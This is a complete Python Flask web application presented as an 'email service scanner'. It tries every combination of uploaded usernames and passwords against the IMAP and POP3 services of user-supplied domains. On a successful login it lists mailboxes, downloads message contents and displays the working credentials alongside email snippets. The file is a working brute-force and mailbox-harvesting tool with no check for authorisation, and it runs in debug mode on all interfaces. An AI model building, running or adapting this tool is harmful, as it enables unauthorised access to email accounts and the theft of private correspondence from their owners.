#!/usr/bin/env python3
"""
Flask-based Email Service Scanner with Robust Progress Feedback
Minimalistic, terminal-like interface. Upload domains, usernames, and passwords.
Tests all username-password combinations against IMAP/POP3 services.
Displays real-time progress including per-credential attempts.
"""

import concurrent.futures
import logging
import socket
import ssl
import time
import json
import threading
import queue
from flask import Flask, request, render_template_string, Response, jsonify
from imaplib import IMAP4, IMAP4_SSL
from poplib import POP3, POP3_SSL, error_proto as POPError

# ---------- Flask App ----------
app = Flask(__name__)
app.secret_key = 'insecure-dev-key-change-in-production'

# ---------- Default Configuration ----------
DEFAULT_TIMEOUT = 10
DEFAULT_MAX_MSGS = 10
DEFAULT_THREADS = 5
PROGRESS_INTERVAL = 10  # Send an update every N credential attempts (lower for demo)
HEARTBEAT_INTERVAL = 10  # Send heartbeat if no messages for 10 seconds

# IMAP: (port, use_ssl, use_starttls)
IMAP_PORTS = [
    (143, False, True),   # Plain with STARTTLS
    (993, True, False),   # SSL
]

# POP3: (port, use_ssl)
POP3_PORTS = [
    (110, False),         # Plain
    (995, True),          # SSL
]

# ---------- Helper Functions ----------
def safe_decode(data):
    if isinstance(data, bytes):
        return data.decode('utf-8', errors='ignore')
    return data

def create_ssl_context(no_verify):
    context = ssl.create_default_context()
    if no_verify:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    return context

# ---------- IMAP Handling with Progress Callback ----------
def check_imap(domain, port, use_ssl, use_starttls, creds, timeout, max_msgs,
               ssl_context, fetch_all, fetch_emails, progress_callback=None):
    """
    Attempt IMAP connection. Returns (success, summary_dict).
    Calls progress_callback(current, total) after each credential attempt.
    """
    conn = None
    summary = {
        "port": port,
        "service": "IMAP",
        "encryption": "SSL" if use_ssl else "STARTTLS" if use_starttls else "plain",
        "success": False,
        "credentials_used": None,
        "capabilities": [],
        "mailboxes": [],
        "message_count": 0,
        "fetched": 0,
        "messages": [],
        "error": None
    }

    try:
        if use_ssl:
            conn = IMAP4_SSL(domain, port, timeout=timeout, ssl_context=ssl_context)
        else:
            conn = IMAP4(domain, port, timeout=timeout)
            if use_starttls:
                conn.starttls(ssl_context=ssl_context)
    except Exception as e:
        summary["error"] = f"Connection failed: {e}"
        return False, summary

    total_creds = len(creds)
    for idx, (user, passwd) in enumerate(creds, 1):
        try:
            conn.login(user, passwd)
            summary["success"] = True
            summary["credentials_used"] = f"{user}:{passwd}"

            # Fetch capabilities
            try:
                typ, data = conn.capability()
                caps = safe_decode(data[0]).split()
                summary["capabilities"] = caps
            except Exception:
                pass

            # List mailboxes
            mailbox_names = []
            try:
                typ, data = conn.list()
                for item in data:
                    decoded = safe_decode(item)
                    if decoded.startswith('* LIST'):
                        parts = decoded.split('"')
                        if len(parts) >= 2:
                            name = parts[1]
                        else:
                            name = decoded.split()[-1]
                    else:
                        name = decoded.split()[-1]
                    mailbox_names.append(name.strip('"'))
            except Exception:
                pass
            summary["mailboxes"] = mailbox_names

            # Select INBOX (or first mailbox)
            target_mbox = "INBOX"
            try:
                typ, data = conn.select(target_mbox)
            except Exception:
                if mailbox_names:
                    target_mbox = mailbox_names[0]
                    try:
                        typ, data = conn.select(target_mbox)
                    except Exception:
                        data = [0]
                else:
                    data = [0]

            msg_count = int(data[0]) if data and data[0] else 0
            summary["message_count"] = msg_count

            # Fetch messages if requested
            if fetch_emails and msg_count > 0:
                fetch_limit = msg_count if fetch_all else min(msg_count, max_msgs)
                fetched = 0
                for i in range(1, fetch_limit + 1):
                    try:
                        typ, data = conn.fetch(str(i), "(RFC822)")
                        raw_email = data[0][1]
                        snippet = safe_decode(raw_email)[:200] + "..."
                        summary["messages"].append(f"Message {i}:\n{snippet}")
                        fetched += 1
                        time.sleep(0.2)
                    except Exception:
                        pass
                summary["fetched"] = fetched

            conn.close()
            conn.logout()
            return True, summary

        except Exception:
            # Report progress
            if progress_callback and (idx % PROGRESS_INTERVAL == 0 or idx == total_creds):
                progress_callback(idx, total_creds, f"IMAP/{port}", domain)
            continue

    summary["error"] = "No valid credentials"
    try:
        conn.close()
        conn.logout()
    except:
        pass
    return False, summary

# ---------- POP3 Handling with Progress Callback ----------
def check_pop3(domain, port, use_ssl, creds, timeout, max_msgs, ssl_context,
               pop3_full, fetch_all, fetch_emails, progress_callback=None):
    conn = None
    summary = {
        "port": port,
        "service": "POP3",
        "encryption": "SSL" if use_ssl else "plain",
        "success": False,
        "credentials_used": None,
        "message_count": 0,
        "total_size": 0,
        "fetched": 0,
        "messages": [],
        "error": None
    }

    try:
        if use_ssl:
            conn = POP3_SSL(domain, port, timeout=timeout, context=ssl_context)
        else:
            conn = POP3(domain, port, timeout=timeout)
    except Exception as e:
        summary["error"] = f"Connection failed: {e}"
        return False, summary

    total_creds = len(creds)
    for idx, (user, passwd) in enumerate(creds, 1):
        try:
            conn.user(user)
            conn.pass_(passwd)
            summary["success"] = True
            summary["credentials_used"] = f"{user}:{passwd}"

            msg_count, total_size = conn.stat()
            summary["message_count"] = msg_count
            summary["total_size"] = total_size

            if fetch_emails and msg_count > 0:
                fetch_limit = msg_count if fetch_all else min(msg_count, max_msgs)
                fetched = 0
                for i in range(1, fetch_limit + 1):
                    try:
                        if pop3_full:
                            lines = conn.retr(i)[1]
                            msg_content = "\n".join(safe_decode(l) for l in lines)
                            snippet = msg_content[:200] + "..."
                        else:
                            lines = conn.top(i, 0)[1]
                            msg_header = "\n".join(safe_decode(l) for l in lines)
                            snippet = msg_header[:200] + "..."
                        summary["messages"].append(f"Message {i}:\n{snippet}")
                        fetched += 1
                        time.sleep(0.2)
                    except Exception:
                        pass
                summary["fetched"] = fetched

            conn.quit()
            return True, summary

        except Exception:
            if progress_callback and (idx % PROGRESS_INTERVAL == 0 or idx == total_creds):
                progress_callback(idx, total_creds, f"POP3/{port}", domain)
            continue

    summary["error"] = "No valid credentials"
    try:
        conn.quit()
    except:
        pass
    return False, summary

# ---------- Threaded Scanner with Queue ----------
def scan_domain_thread(domain, creds, timeout, max_msgs, no_ssl_verify,
                       fetch_all, pop3_full, fetch_emails, msg_queue):
    """Run scans for a domain and put messages into the queue."""
    # Send domain start message
    msg_queue.put({
        "type": "domain_start",
        "domain": domain
    })

    ssl_context = create_ssl_context(no_ssl_verify)
    domain_result = {
        "domain": domain,
        "services": []
    }

    # Helper to queue progress messages
    def progress_callback(current, total, service, domain):
        msg_queue.put({
            "type": "attempt",
            "domain": domain,
            "service": service,
            "current": current,
            "total": total
        })

    # IMAP checks
    for port, use_ssl, use_starttls in IMAP_PORTS:
        success, svc_summary = check_imap(
            domain, port, use_ssl, use_starttls,
            creds, timeout, max_msgs, ssl_context, fetch_all, fetch_emails,
            progress_callback=progress_callback
        )
        svc_summary["domain"] = domain
        domain_result["services"].append(svc_summary)
        if success:
            msg_queue.put({
                "type": "success",
                "domain": domain,
                "service": f"IMAP/{port} ({svc_summary['encryption']})",
                "credentials": svc_summary['credentials_used'],
                "msg_count": svc_summary['message_count'],
                "fetched": svc_summary['fetched']
            })

    # POP3 checks
    for port, use_ssl in POP3_PORTS:
        success, svc_summary = check_pop3(
            domain, port, use_ssl,
            creds, timeout, max_msgs, ssl_context, pop3_full, fetch_all, fetch_emails,
            progress_callback=progress_callback
        )
        svc_summary["domain"] = domain
        domain_result["services"].append(svc_summary)
        if success:
            total_size_mb = svc_summary["total_size"] / (1024*1024) if svc_summary["total_size"] else 0
            msg_queue.put({
                "type": "success",
                "domain": domain,
                "service": f"POP3/{port} ({svc_summary['encryption']})",
                "credentials": svc_summary['credentials_used'],
                "msg_count": svc_summary['message_count'],
                "size_mb": round(total_size_mb, 2),
                "fetched": svc_summary['fetched']
            })

    # Signal completion for this domain
    msg_queue.put({"type": "domain_done", "domain": domain, "result": domain_result})

# ---------- Streaming Generator (inner function) ----------
def generate_progress(domains, creds, timeout, max_msgs, no_ssl_verify,
                      fetch_all, pop3_full, fetch_emails, threads):
    """Generator that yields progress messages as JSON lines."""
    # Send start message immediately
    yield json.dumps({"type": "start", "total": len(domains)}) + "\n"

    msg_queue = queue.Queue()
    active_domains = len(domains)
    lock = threading.Lock()

    def domain_wrapper(domain):
        nonlocal active_domains
        try:
            scan_domain_thread(domain, creds, timeout, max_msgs, no_ssl_verify,
                               fetch_all, pop3_full, fetch_emails, msg_queue)
        except Exception as e:
            # Send error to queue
            msg_queue.put({"type": "error", "message": f"Domain {domain} failed: {str(e)}"})
        finally:
            with lock:
                active_domains -= 1

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(domain_wrapper, domain) for domain in domains]

        last_msg_time = time.time()
        while active_domains > 0 or not msg_queue.empty():
            try:
                msg = msg_queue.get(timeout=HEARTBEAT_INTERVAL)
                yield json.dumps(msg) + "\n"
                last_msg_time = time.time()
            except queue.Empty:
                yield json.dumps({"type": "heartbeat", "time": time.time()}) + "\n"
                # Check if any future failed
                for f in futures:
                    if f.done() and f.exception():
                        yield json.dumps({"type": "error", "message": str(f.exception())}) + "\n"

    yield json.dumps({"type": "all_done"}) + "\n"

# ---------- HTML Template ----------
INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>emailscanner · terminal</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.4;
            margin: 20px;
        }
        h1, h2 {
            color: #0f0;
            border-bottom: 1px solid #0f0;
            font-weight: normal;
        }
        form {
            border: 1px solid #0f0;
            padding: 15px;
            max-width: 800px;
        }
        label {
            display: inline-block;
            width: 150px;
        }
        input, textarea, select {
            background-color: #111;
            color: #0f0;
            border: 1px solid #0f0;
            font-family: 'Courier New', monospace;
            padding: 5px;
            margin: 5px 0;
            width: 300px;
        }
        input[type="file"] {
            width: auto;
        }
        input[type="checkbox"] {
            width: auto;
            margin-left: 150px;
        }
        button {
            background-color: #000;
            color: #0f0;
            border: 2px solid #0f0;
            padding: 10px 20px;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0f0;
            color: #000;
        }
        .note {
            color: #888;
            font-size: 12px;
            margin-top: 10px;
        }
        hr {
            border: none;
            border-top: 1px dashed #0f0;
        }
        #progress {
            margin-top: 20px;
            border: 1px solid #0f0;
            padding: 10px;
            max-height: 400px;
            overflow-y: auto;
            background-color: #111;
        }
        #progress .info { color: #0f0; }
        #progress .success { color: #0f0; font-weight: bold; }
        #progress .heartbeat { color: #666; }
        #progress .attempt { color: #aa0; }
        #results {
            margin-top: 20px;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <h1>📧 EMAIL SERVICE SCANNER (IMAP/POP3)</h1>
    <p>Upload username & password files. All combinations will be tested against each domain.</p>
    <form id="scanForm" enctype="multipart/form-data">
        <label>Domains (one per line):</label><br>
        <textarea name="domains" rows="6" cols="50" placeholder="example.com&#10;test.org"></textarea><br>

        <label>Usernames file:</label>
        <input type="file" name="userfile" accept=".txt,.csv" required><br>
        <label>Passwords file:</label>
        <input type="file" name="passfile" accept=".txt,.csv" required><br>

        <label>Timeout (s):</label>
        <input type="number" name="timeout" value="10" min="1"><br>

        <label>Max messages to fetch:</label>
        <input type="number" name="max_msgs" value="10" min="0"><br>

        <label>Threads (domains in parallel):</label>
        <input type="number" name="threads" value="3" min="1"><br>

        <input type="checkbox" name="fetch_all" value="yes"> Fetch all messages (overrides max)<br>
        <input type="checkbox" name="pop3_full" value="yes"> POP3: fetch full messages (instead of headers)<br>
        <input type="checkbox" name="no_ssl_verify" value="yes"> Disable SSL verification (INSECURE)<br>
        <input type="checkbox" name="fetch_emails" value="yes" checked> Fetch and display message snippets<br>

        <button type="submit">[ SCAN ]</button>
    </form>

    <div id="progress" class="hidden">
        <h2>📡 PROGRESS</h2>
        <pre id="log"></pre>
    </div>

    <div id="results" class="hidden">
        <h2>📋 RESULTS</h2>
        <div id="results-content"></div>
    </div>

    <script>
        document.getElementById('scanForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const form = e.target;
            const formData = new FormData(form);

            const progressDiv = document.getElementById('progress');
            const logPre = document.getElementById('log');
            const resultsDiv = document.getElementById('results');
            const resultsContent = document.getElementById('results-content');
            progressDiv.classList.remove('hidden');
            resultsDiv.classList.add('hidden');
            logPre.textContent = '';

            try {
                const response = await fetch('/scan/stream', {
                    method: 'POST',
                    body: formData
                });

                const reader = response.body.getReader();
                const decoder = new TextDecoder();
                let buffer = '';
                let domainResults = [];

                while (true) {
                    const { done, value } = await reader.read();
                    if (done) break;
                    buffer += decoder.decode(value, { stream: true });
                    const lines = buffer.split('\\n');
                    buffer = lines.pop();

                    for (const line of lines) {
                        if (line.trim() === '') continue;
                        try {
                            const msg = JSON.parse(line);
                            handleMessage(msg, logPre, domainResults, resultsContent, resultsDiv);
                        } catch (err) {
                            logPre.textContent += `\\n[CLIENT ERROR] Failed to parse: ${line}\\n`;
                        }
                    }
                }
            } catch (err) {
                logPre.textContent += `\\n[NETWORK ERROR] ${err.message}\\n`;
            }
        });

        function handleMessage(msg, logPre, domainResults, resultsContent, resultsDiv) {
            if (msg.type === 'start') {
                logPre.textContent += `[INFO] Starting scan of ${msg.total} domains...\\n`;
            } else if (msg.type === 'domain_start') {
                logPre.textContent += `\\n[INFO] Scanning ${msg.domain}...\\n`;
            } else if (msg.type === 'attempt') {
                // Show progress every PROGRESS_INTERVAL attempts
                logPre.textContent += `[${msg.domain} ${msg.service}] testing credential ${msg.current}/${msg.total}\\n`;
            } else if (msg.type === 'success') {
                let line = `[SUCCESS] ${msg.domain}: ${msg.service} - ${msg.credentials} - msgs: ${msg.msg_count}`;
                if (msg.size_mb) line += ` (${msg.size_mb} MB)`;
                line += ` (fetched ${msg.fetched})\\n`;
                logPre.textContent += line;
            } else if (msg.type === 'heartbeat') {
                // Optionally show heartbeat as a subtle indicator (commented out)
                // logPre.textContent += '.';
            } else if (msg.type === 'domain_done') {
                domainResults.push(msg.result);
            } else if (msg.type === 'error') {
                logPre.textContent += `\\n[ERROR] ${msg.message}\\n`;
            } else if (msg.type === 'all_done') {
                logPre.textContent += '\\n[INFO] Scan complete. Rendering results...\\n';
                renderResults(domainResults, resultsContent);
                resultsDiv.classList.remove('hidden');
            }
        }

        function renderResults(domainResults, container) {
            let html = '';
            for (const dr of domainResults) {
                html += `<div class="result-domain"><h3>🔍 ${dr.domain}</h3>`;
                for (const svc of dr.services) {
                    if (!svc.success) continue;
                    html += `<div style="margin-left:20px; margin-bottom:15px;">`;
                    html += `<strong>${svc.service}:${svc.port} (${svc.encryption})</strong><br>`;
                    html += `Credentials: ${svc.credentials_used}<br>`;
                    if (svc.mailboxes && svc.mailboxes.length) {
                        html += `Mailboxes: ${svc.mailboxes.join(', ')}<br>`;
                    }
                    html += `Message count: ${svc.message_count} (fetched: ${svc.fetched})<br>`;
                    if (svc.total_size) {
                        html += `Total size: ${(svc.total_size / 1024).toFixed(2)} KB<br>`;
                    }
                    if (svc.messages && svc.messages.length) {
                        html += `<details><summary>📨 message snippets (${svc.messages.length})</summary>`;
                        html += `<pre style="background:#222; padding:5px;">`;
                        for (const m of svc.messages) {
                            html += escapeHtml(m) + '\\n\\n';
                        }
                        html += `</pre></details>`;
                    }
                    html += `</div>`;
                }
                html += `</div><hr>`;
            }
            container.innerHTML = html;
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
    </script>
</body>
</html>
"""

# ---------- Flask Routes ----------
@app.route('/')
def index():
    return render_template_string(INDEX_HTML)

@app.route('/scan/stream', methods=['POST'])
def scan_stream():
    """Streaming endpoint with progress updates."""
    # Extract all request data HERE (inside request context)
    domains_text = request.form.get('domains', '').strip()
    if not domains_text:
        return jsonify({"error": "No domains provided"}), 400
    domains = [line.strip() for line in domains_text.splitlines() if line.strip()]

    user_file = request.files.get('userfile')
    pass_file = request.files.get('passfile')
    if not user_file or not pass_file:
        return jsonify({"error": "Username and password files are required"}), 400

    try:
        usernames = [line.decode('utf-8').strip() for line in user_file.stream.read().splitlines() if line.strip()]
        passwords = [line.decode('utf-8').strip() for line in pass_file.stream.read().splitlines() if line.strip()]
    except Exception as e:
        return jsonify({"error": f"Error reading files: {e}"}), 400

    creds = [(u, p) for u in usernames for p in passwords]

    timeout = int(request.form.get('timeout', DEFAULT_TIMEOUT))
    max_msgs = int(request.form.get('max_msgs', DEFAULT_MAX_MSGS))
    threads = int(request.form.get('threads', DEFAULT_THREADS))
    fetch_all = 'fetch_all' in request.form
    pop3_full = 'pop3_full' in request.form
    no_ssl_verify = 'no_ssl_verify' in request.form
    fetch_emails = 'fetch_emails' in request.form

    # Return a streaming response using the inner generator
    return Response(
        generate_progress(domains, creds, timeout, max_msgs, no_ssl_verify,
                          fetch_all, pop3_full, fetch_emails, threads),
        mimetype='application/x-ndjson'
    )

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
